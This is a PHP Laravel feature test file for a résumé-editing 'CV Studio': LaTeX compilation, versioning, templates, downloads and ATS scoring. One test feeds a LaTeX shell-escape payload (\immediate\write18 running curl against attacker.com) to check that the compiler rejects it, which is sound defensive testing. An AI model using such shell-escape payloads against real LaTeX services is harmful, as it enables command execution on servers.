<?php

namespace Tests\Feature;

use App\Models\User;
use App\Modules\Resume\app\Models\Resume;
use App\Modules\Resume\app\Models\ResumeVersion;
use App\Modules\Resume\app\Services\ATSAnalysisService;
use App\Modules\Resume\app\Services\LatexCompilerService;
use App\Modules\Resume\app\Services\ResumeService;
use App\Modules\Resume\app\Services\ResumeTemplateService;
use App\Modules\RoleProfiles\app\Services\RoleProfileService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class CVStudioTest extends TestCase
{
    use RefreshDatabase;

    protected function setupUserAndResume(): array
    {
        $user = User::factory()->create();
        app(RoleProfileService::class)->seedDefaultProfilesForUser($user);
        $resumes = app(ResumeService::class)->getOrSeedResumesForUser($user);
        $resume = $resumes->first();

        return [$user, $resume];
    }

    public function test_guests_are_redirected_from_cv_editor(): void
    {
        $response = $this->get('/cv-studio/editor/1');
        $response->assertRedirect('/login');
    }

    public function test_user_can_access_cv_editor_with_template_and_ats_analysis(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        $response = $this->actingAs($user)->get("/cv-studio/editor/{$resume->id}");
        $response->assertStatus(200);
        $response->assertSee($resume->title);
        $response->assertSee('LaTeX Source');
        $response->assertSee('Compile PDF');
        $response->assertSee('ATS Scoring');
        $response->assertSee('v1');
    }

    public function test_latex_compiler_service_sanitizes_dangerous_macro_commands(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        $maliciousLatex = "\\documentclass{article}\n\\begin{document}\n\\immediate\\write18{curl attacker.com}\n\\end{document}";

        $response = $this->actingAs($user)->postJson("/cv-studio/editor/{$resume->id}/compile", [
            'latex_source' => $maliciousLatex,
        ]);

        $response->assertStatus(422);
        $data = $response->json();
        $this->assertFalse($data['success']);
        $this->assertStringContainsString('Dangerous LaTeX command detected', $data['logs']);
    }

    public function test_user_can_compile_latex_source_and_receive_valid_pdf_stream(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        $templateService = app(ResumeTemplateService::class);
        $cleanLatex = $templateService->getTemplateSource('backend_developer', $user);

        $response = $this->actingAs($user)->postJson("/cv-studio/editor/{$resume->id}/compile", [
            'latex_source' => $cleanLatex,
        ]);

        $response->assertStatus(200);
        $data = $response->json();
        $this->assertTrue($data['success']);
        $this->assertNotEmpty($data['pdf_url']);
        $this->assertGreaterThanOrEqual(80, $data['ats']['score']);

        // Test the preview-pdf endpoint
        $previewResponse = $this->actingAs($user)->get("/cv-studio/editor/{$resume->id}/preview-pdf");
        $previewResponse->assertStatus(200);
        $this->assertStringContainsString('application/pdf', $previewResponse->headers->get('Content-Type'));
    }

    public function test_user_can_save_new_version_checkpoint(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        $newLatex = "\\documentclass{article}\n\\begin{document}\n\\section{Professional Summary}\nUpdated experience details.\n\\section{Technical Skills}\nPHP 8.4, Laravel 13.\n\\section{Work Experience}\nLead Developer.\n\\end{document}";

        $response = $this->actingAs($user)->post("/cv-studio/editor/{$resume->id}/save-version", [
            'latex_source' => $newLatex,
            'optimization_notes' => 'Refactored backend experience metrics',
        ]);

        $response->assertRedirect();
        $response->assertSessionHas('success');

        $this->assertEquals(2, ResumeVersion::where('resume_id', $resume->id)->count());

        $resume->refresh();
        $this->assertEquals(2, $resume->currentVersion->version_number);
        $this->assertEquals('Refactored backend experience metrics', $resume->currentVersion->optimization_notes);
    }

    public function test_user_can_apply_different_ats_template(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        $response = $this->actingAs($user)->post("/cv-studio/editor/{$resume->id}/apply-template", [
            'template_key' => 'executive_lead',
        ]);

        $response->assertRedirect();
        $response->assertSessionHas('success');

        $resume->refresh();
        $this->assertEquals('executive_lead', $resume->currentVersion->template_name);
        $this->assertStringContainsString('Executive Summary', $resume->currentVersion->latex_source);
    }

    public function test_user_can_download_tex_and_pdf_files(): void
    {
        [$user, $resume] = $this->setupUserAndResume();

        // Test TeX download
        $texResponse = $this->actingAs($user)->get("/cv-studio/editor/{$resume->id}/download-tex");
        $texResponse->assertStatus(200);
        $this->assertStringContainsString('attachment', $texResponse->headers->get('Content-Disposition'));
        $this->assertStringContainsString('.tex', $texResponse->headers->get('Content-Disposition'));

        // Test PDF download
        $pdfResponse = $this->actingAs($user)->get("/cv-studio/editor/{$resume->id}/download-pdf");
        $pdfResponse->assertStatus(200);
        $this->assertStringContainsString('attachment', $pdfResponse->headers->get('Content-Disposition'));
        $this->assertStringContainsString('.pdf', $pdfResponse->headers->get('Content-Disposition'));
        $this->assertStringContainsString('application/pdf', $pdfResponse->headers->get('Content-Type'));
    }

    public function test_ats_analysis_service_evaluates_scores_and_detects_sections(): void
    {
        $atsService = app(ATSAnalysisService::class);

        // Good ATS LaTeX
        $goodLatex = <<<'LATEX'
\documentclass{article}
\begin{document}
John Doe \\ john@example.com \\ (555) 123-4567 \\ github.com/johndoe
\section{Professional Summary}
Senior Software Engineer with 7 years experience.
\section{Technical Skills}
PHP 8.4, Laravel, TiDB Cloud, Redis.
\section{Work Experience}
\item Architected high throughput distributed queue handling 15M requests and reduced latency by 40%.
\section{Education}
B.S. in Computer Science.
\end{document}
LATEX;

        $analysis = $atsService->analyze($goodLatex);
        $this->assertGreaterThanOrEqual(85, $analysis['score']);
        $this->assertContains('Professional Summary', $analysis['sections_found']);
        $this->assertContains('Technical Skills', $analysis['sections_found']);
        $this->assertEmpty($analysis['red_flags']);

        // Bad ATS LaTeX with table red flags
        $tableLatex = <<<'LATEX'
\documentclass{article}
\begin{document}
\begin{tabular}{|c|c|}
Name & Summary \\
\end{tabular}
\end{document}
LATEX;

        $badAnalysis = $atsService->analyze($tableLatex);
        $this->assertLessThan(80, $badAnalysis['score']);
        $this->assertNotEmpty($badAnalysis['red_flags']);
    }
}

